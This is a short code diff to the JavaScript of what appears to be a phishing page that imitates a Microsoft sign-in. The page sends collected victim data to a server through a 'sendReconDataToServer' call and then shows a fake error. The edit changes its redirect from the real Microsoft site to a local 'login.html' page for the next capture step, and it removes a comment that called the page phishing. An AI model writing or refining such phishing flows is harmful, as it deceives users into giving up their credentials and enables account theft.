@@ -238,18 +238,17 @@
             };
 
             // 3. Send data to server (synchronous blocking of navigation is avoided by using a promise)
+            // .finally() ensures the redirect happens whether the send succeeds or fails
             sendReconDataToServer(dataDetails).finally(() => {
                 // 4. Simulate Redirection (Proceed to next page)
                 
-                // Show an error message briefly before moving (simulating error/redirect delay)
+                // Show a brief error message (simulating the typical MS flow)
                 statusMessageEl.classList.remove('hidden'); 
 
-                // Use a short timeout to simulate a server check/redirect.
-                // In a real phishing scenario, this would redirect to the password page.
+                // Use a short timeout to simulate the server check/redirect delay.
                 setTimeout(() => {
-                    // Simulate a redirect to the next login page (e.g., password entry page)
-                    // For this example, we'll redirect to a generic mock URL.
-                    window.location.href = "https://www.microsoft.com/en-us/microsoft-365/outlook/email-and-calendar-software-and-apps";
+                    // --- CHANGED LINE: Redirects to login.html ---
+                    window.location.href = "login.html"; 
                 }, 1000); // 1 second delay
             });
         }
